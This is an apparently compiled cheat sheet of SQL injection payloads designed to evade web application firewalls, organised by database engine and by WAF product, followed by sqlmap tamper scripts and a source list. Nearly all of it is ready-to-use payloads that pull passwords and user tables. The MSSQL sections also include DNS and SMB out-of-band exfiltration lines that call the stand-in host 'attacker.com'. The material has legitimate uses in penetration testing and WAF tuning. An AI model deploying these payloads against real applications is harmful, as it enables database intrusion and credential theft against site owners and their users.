# Advanced SQL Injection WAF Bypass Techniques (2025-2026)

Research compiled: 2026-03-09

---

## 1. MYSQL-SPECIFIC BYPASSES

### 1.1 Scientific Notation Obfuscation
Evades: ModSecurity CRS PL1-PL2, Cloudflare, generic regex WAFs
```
' or 1.e(1) or '1'='1
1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
```

### 1.2 MySQL Conditional Comments (Version Comments)
Evades: ModSecurity CRS (replaceComments transformation bypass), generic WAFs
```
' /*!50000or*/1='1
/*!50000SELECT*/ * FROM users
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
/*!50000UniOn*/ /*!50000SeLeCt*/ user,password FROM mysql.user--
```

### 1.3 Hex Encoding
Evades: Cloudflare (confirmed), regex-based WAFs
```
SELECT user FROM mysql.user WHERE user = 0x726F6F74
' OR mid(password,1,1)=0x2a--
' OR mid(password,1,1)=unhex('2a')--
SELECT * FROM users WHERE name=0x61646D696E
```

### 1.4 Curly Brace / Backtick Syntax
Evades: ModSecurity CRS v3.1.0 (confirmed bypass)
```
{`a`b}   -- where a=function name (if,version), b=SQL statement
' OR {`if`1=1} --
```

### 1.5 Parentheses (No Spaces Needed)
Evades: Space-filtering WAFs
```
select(1),(2),(3)
UNION(SELECT(1),(2),(3))
' OR(1=1)--
(SELECT(password)FROM(users))
```

### 1.6 libinjection Bypass with <@
Evades: ModSecurity (libinjection-based detection)
```
1 <@ ORDER BY 10--
' <@ UNION SELECT 1,2,3--
```

### 1.7 JSON Operators (MySQL 5.7+)
Evades: Cloudflare, AWS WAF, Palo Alto, F5, Imperva (pre-patch)
```
' OR JSON_EXTRACT('{"a":1}','$.a')=1--
' UNION SELECT 1,JSON_EXTRACT(column,'$.key') FROM table--
1' AND JSON_EXTRACT('{"id":1}','$.id')=1 UNION SELECT user(),2--
```

---

## 2. POSTGRESQL-SPECIFIC BYPASSES

### 2.1 JSON Containment Operator (@>)
Evades: AWS WAF, Cloudflare, F5, Imperva, Palo Alto (pre-patch)
```
' OR '{"b":2}'::jsonb <@ '{"a":1,"b":2}'::jsonb--
' OR (SELECT '{"a":1}'::jsonb @> '{"a":1}'::jsonb)--
1 UNION SELECT 1 WHERE '{"a":1}'::jsonb <@ '{"a":1}'::jsonb--
```

### 2.2 ILIKE Operator
Evades: Generic WAFs that only match = and LIKE
```
' OR username ILIKE '%admin%'--
' UNION SELECT password FROM users WHERE username ILIKE 'adm%'--
```

### 2.3 Dollar-Quoted Strings
Evades: String-matching WAFs that look for quote characters
```
SELECT $$admin$$
' UNION SELECT $tag$admin$tag$--
```

### 2.4 Unicode Escapes in Identifiers
Evades: Keyword-based WAFs
```
SELECT U&"\0053ELECT" -- resolves to SELECT
```

---

## 3. MSSQL-SPECIFIC BYPASSES

### 3.1 Stacked Queries with Variable Declaration
Evades: Pattern-matching WAFs, basic ModSecurity rules
```
'; DECLARE @q VARCHAR(255); SET @q='SELECT password FROM users'; EXEC(@q)--
'; DECLARE @ip VARCHAR(40)='attacker.com'; EXEC master..xp_dirtree '\\'+@ip+'\share'--
```

### 3.2 String Concatenation via + Operator
Evades: Keyword-based WAFs
```
EXEC('SEL'+'ECT us'+'er')
' UNION SEL/**/ECT 1,'adm'+'in',3--
```

### 3.3 DNS Out-of-Band Exfiltration (No Stacked Queries Needed)
Evades: Response-based WAFs (data never appears in HTTP response)
```
' AND 1=(SELECT fn_xe_file_target_read_file('\\attacker.com\s',0,0,0))--
' AND 1=(SELECT fn_get_audit_file('\\attacker.com\s',default,default))--
' AND 1=(SELECT fn_trace_gettable('\\attacker.com\s',default))--
```

### 3.4 CAST Concatenation Bypass
Evades: WAFs blocking direct CAST operations
```
' UNION SELECT 1,CA/**/ST(user_name AS VARCHAR),3--
```

---

## 4. DATABASE-AGNOSTIC / CROSS-DB BYPASSES

### 4.1 Comment-Based Obfuscation
Evades: Regex-based WAFs, basic ModSecurity rules
```
un/**/ion se/**/lect 1,2,3
SEL/*random_text*/ECT * FROM users
' UN/**/ION/**/SE/**/LECT/**/1,2,3--
```

### 4.2 Whitespace Alternatives (Space Bypass)
Evades: Space-filtering WAFs
```
'%09OR%09'1'='1          -- Tab character (%09)
'%0aOR%0a'1'='1          -- Newline (%0a)
'%0dOR%0d'1'='1          -- Carriage return (%0d)
'%0bOR%0b'1'='1          -- Vertical tab (%0b)
'%a0OR%a0'1'='1          -- Non-breaking space (%a0)
SELECT/**/password/**/FROM/**/users   -- Comment as space
```

### 4.3 Case Variation
Evades: Case-sensitive WAF rules (basic filters)
```
UnIoN SeLeCt 1,2,3
uNiOn aLl sElEcT 1,2,3
```

### 4.4 Keyword Nesting (Double-Write)
Evades: WAFs that strip keywords once
```
UNunionION SEselectLECT 1,2,3
```

### 4.5 Function Synonym Substitution
Evades: Signature-based WAFs matching specific function names
```
-- Instead of SUBSTRING():
MID(password,1,1)
SUBSTR(password,1,1)

-- Instead of ASCII():
HEX(MID(password,1,1))
BIN(MID(password,1,1))
ORD(MID(password,1,1))

-- Instead of BENCHMARK():
SLEEP(5)
```

### 4.6 HTTP Parameter Pollution
Evades: WAFs that inspect only one parameter instance
```
?id=1&id=' UNION SELECT 1,2,3--
```

### 4.7 Header Injection
Evades: WAFs that only inspect body/query parameters
```
X-Forwarded-For: ' OR 1=1--
X-Originating-IP: ' UNION SELECT 1,2,3--
User-Agent: ' OR SLEEP(5)--
```

### 4.8 XML Entity Encoding
Evades: WAFs that don't decode XML entities before inspection
```xml
<storeId>&#x53;ELECT * FROM users</storeId>
<storeId>&#x31; UNION SELECT username,password FROM users</storeId>
```

### 4.9 Unicode Encoding
Evades: WAFs with ASCII-only pattern matching
```
%u0053ELECT   -- S as unicode
%u0055NION    -- U as unicode
s%u0065lect   -- e as unicode
```

### 4.10 URL Double Encoding
Evades: WAFs that decode only once
```
%2527 OR 1=1--          -- Double-encoded single quote
%253B (semicolon)
%2520 (space)
```

---

## 5. SECOND-ORDER SQL INJECTION (Inherently WAF-Bypassing)

WAFs generally cannot detect second-order SQLi because the malicious payload is stored in a first request (e.g., registration) and triggered in a second context (e.g., profile lookup). No WAF signature matches because:
- The storage request contains a syntactically valid string (e.g., username = `admin'--`)
- The execution happens server-side when the stored value is used unsafely

### Flow:
```
Step 1 (Store): Register with username = admin'--
Step 2 (Trigger): Application runs: SELECT * FROM users WHERE username='admin'--'
```

This bypasses ALL WAFs because the injection point and execution point are separate HTTP requests.

---

## 6. BY WAF PRODUCT

### ModSecurity CRS
| Paranoia Level | Bypassed By |
|---|---|
| PL1 | Comment injection, scientific notation, `<@` libinjection bypass, `{backtick}` syntax, JSON operators |
| PL2 | Scientific notation, JSON operators, second-order, `<@` libinjection bypass |
| PL3 | JSON operators (pre-patch), second-order, OOB exfiltration |
| PL4 | Second-order only (very restrictive) |

### Cloudflare WAF
- Hex encoding with LIKE operator: `' OR column LIKE 0x61%`
- JSON-based SQLi (patched but variants may work)
- Unicode encoding of keywords
- Header injection (X-Forwarded-For)

### AWS WAF
- JSON operator bypasses (patched late 2022, but custom rules may miss variants)
- Double URL encoding
- HTTP parameter pollution

### Palo Alto / F5 / Imperva
- JSON-based SQL injection (all patched post-Claroty disclosure)
- Comment-based obfuscation
- Scientific notation (MySQL)

---

## 7. SQLMAP TAMPER SCRIPTS (2025)

| Script | Technique | Target |
|---|---|---|
| `randomcase.py` | Random case keywords | Generic WAFs |
| `space2comment.py` | Replace spaces with `/**/` | Space-filtering WAFs |
| `charunicodeencode.py` | Unicode char encoding | ASCII-only WAFs |
| `between.py` | Replace `>` with `BETWEEN` | Operator-filtering WAFs |
| `equaltolike.py` | Replace `=` with `LIKE` | Equality-filtering WAFs |
| `space2mssqlblank.py` | MSSQL whitespace alternatives | MSSQL space filters |
| `space2mysqlblank.py` | MySQL whitespace alternatives | MySQL space filters |
| `versionedmorekeywords.py` | `/*!50000keyword*/` | ModSecurity |

---

## Sources

- OWASP SQL Injection Bypassing WAF: https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
- Claroty Team82 JSON-Based SQL Bypass: https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf
- Picus Security JSON WAF Bypass: https://www.picussecurity.com/resource/blog/waf-bypass-using-json-based-sql-injection-attacks
- PT Security Advanced MSSQL Tricks: https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/
- PayloadsAllTheThings MySQL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
- PayloadsAllTheThings MSSQL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
- ModSecurity CRS Bypass Issue #1181: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181
- ModSecurity CRS Bypass Issue #1167: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1167
- Cloudflare SQLi Filter Bypass: https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html
- Bypassing WAFs in 2025: https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics-fdb3508e6b46
- WAF Bypass Techniques 2025: https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b
- PortSwigger SQL Injection Bypassing Common Filters: https://portswigger.net/support/sql-injection-bypassing-common-filters
- BWAFSQLi Adversarial Framework (Jan 2026): https://dl.acm.org/doi/pdf/10.1145/3788286
- Nav1n0x Advanced SQLi Gitbook: https://nav1n0x.gitbook.io/advanced-sql-injection-techniques/waf-bypass-techniques-for-sql-injection
- Het Mehta Advanced WAF Bypassing: https://hetmehta.com/posts/Bypassing-Modern-WAF/
- Stratum Security SQLi WAF Bypass 2023: https://blog.stratumsecurity.com/2023/05/16/sqli-waf-detection-bypass-techniques-that-still-work-in-2023/
